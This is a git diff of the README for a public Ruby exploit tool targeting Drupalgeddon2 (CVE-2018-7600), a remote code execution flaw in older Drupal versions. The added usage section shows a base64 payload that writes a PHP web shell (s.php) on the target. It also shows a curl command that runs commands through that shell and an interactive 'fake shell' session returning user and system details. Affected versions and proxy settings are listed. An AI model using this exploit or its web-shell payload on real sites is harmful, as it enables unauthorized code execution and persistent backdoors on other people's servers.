@@ -1,26 +1,46 @@
-#### Exploit
-[Hans Topo](https://github.com/dreadlocked) & [g0tmi1k](https://blog.g0tmi1k.com/)'s ruby port of [Drupalggedon2](https://www.drupal.org/sa-core-2018-002) exploit ~ https://github.com/dreadlocked/Drupalgeddon2/
+# CVE-2018-7600 | Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' RCE (SA-CORE-2018-002)
 
-_Based on [Vitalii Rudnykh's original PoC](https://github.com/a2u/CVE-2018-7600)_
+[Drupalggedon2 - https://github.com/dreadlocked/Drupalgeddon2/](https://github.com/dreadlocked/Drupalgeddon2/) _([https://www.drupal.org/sa-core-2018-002](https://www.drupal.org/sa-core-2018-002))_
 
-This uses Drupal's `user/register` URL, attacking `account/mail` AJAX & `#post_render` parameter, using PHP's `exec` function.
+- [Hans Topo](https://github.com/dreadlocked)
+- [g0tmi1k](https://blog.g0tmi1k.com/)
+
+Supports:
+- < 7.58 ~ `user/password` URL, attacking `triggering_element_name` form & `#post_render` parameter, using PHP's `passthru` function.
+- < 8.3.9 / < 8.4.6 / < 8.5.1 ~ `user/register` URL, attacking `account/mail` AJAX & `#post_render` parameter, using PHP's `exec` function.
 
 This method was chosen, as it will return `HTTP 200`, and render the output in the `data` JSON response _(un-comment the code for `timezone`/`#lazy_builder` method, which will return `HTTP 500` & blind!)_ {[More Information](https://gist.github.com/g0tmi1k/7476eec3f32278adc07039c3e5473708)}.
-
-`sa-core-2018-002` exploit
-
-...aka `Drupalgeddon 2` exploit
-
-...aka `CVE-2018-7600` exploit
 
 - - -
 
 #### Usage:
 
 ```bash
-$ ruby drupalgeddon2.rb https://example.com whoami
+$ ruby drupalgeddon2.rb http://localhost/drupal/
+[*] --==[::#Drupalggedon2::]==--
+--------------------------------------------------------------------------------
+[*] Target : http://localhost/drupal/
+[*] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbImMiXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsiYyJdIC4gIiAyPiYxIiApOyB9 | base64 -d | tee s.php
+--------------------------------------------------------------------------------
+[!] MISSING: http://localhost/drupal/CHANGELOG.txt (404)
+[+] Found  : http://localhost/drupal/core/CHANGELOG.txt (200)
+[+] Drupal!: 8.4.5
+--------------------------------------------------------------------------------
+[*] PHP cmd: exec
+--------------------------------------------------------------------------------
+[+] Target seems to be exploitable! w00hooOO!
+[+] Result: <?php if( isset( $_REQUEST["c"] ) ) { system( $_REQUEST["c"] . " 2>&1" ); }<span class="ajax-new-content"></span>
+--------------------------------------------------------------------------------
+[*]   curl 'http://localhost/drupal/s.php' -d 'c=whoami'
+--------------------------------------------------------------------------------
+[*] Fake shell:
+drupalgeddon2> id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+drupalgeddon2>
+drupalgeddon2> uname -a
+Linux ubuntu140045x64-drupal 3.13.0-144-generic #193-Ubuntu SMP Thu Mar 15 17:03:53 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+drupalgeddon2>
 ```
-...afterwards, just call: `curl 'https://example.com/s.php?c=uname -a'`
 
 For proxy support, edit the file, replacing with your values. Example:
 
@@ -35,9 +55,9 @@ proxy_port = 8080
 
 Drupal Advisory ~ https://www.drupal.org/sa-core-2018-002
 
-Vulnerable Versions (Check: https://example.com/CHANGELOG.txt):
+Vulnerable Versions:
 
-* < 7.58
+* < 7.58        **(Tested)**
 * 8.x < 8.3.9
 * 8.4.x < 8.4.6 **(Tested)**
 * 8.5.x < 8.5.1 **(Tested)**
@@ -49,10 +69,5 @@ Vulnerable Versions (Check: https://example.com/CHANGELOG.txt):
 - **Write up & Research** ~ https://research.checkpoint.com/uncovering-drupalgeddon-2/
 - Drupal Advisory ~ https://www.drupal.org/sa-core-2018-002
 - Original Python PoC ~ https://github.com/a2u/CVE-2018-7600
-- cURL PoC ~ https://twitter.com/i_bo0om/status/984674893768921089
-- Burp PoC (Auth Needed) ~ https://twitter.com/RicterZ/status/984495201354854401
-- 2x cURL RCEs ~ https://gist.github.com/g0tmi1k/7476eec3f32278adc07039c3e5473708
-- cURL RCE ~ https://gist.github.com/AlbinoDrought/626c07ee96bae21cb174003c9c710384
-- cURL rev_nc ~ https://gist.github.com/AlbinoDrought/2854ca1b2a9a4f33ca87581cf1e1fdd4
+- cURL commands ~ https://gist.github.com/g0tmi1k/7476eec3f32278adc07039c3e5473708
 - CVE ~ https://nvd.nist.gov/vuln/detail/CVE-2018-7600
-- Collection ~ https://github.com/g0rx/CVE-2018-7600-Drupal-RCE
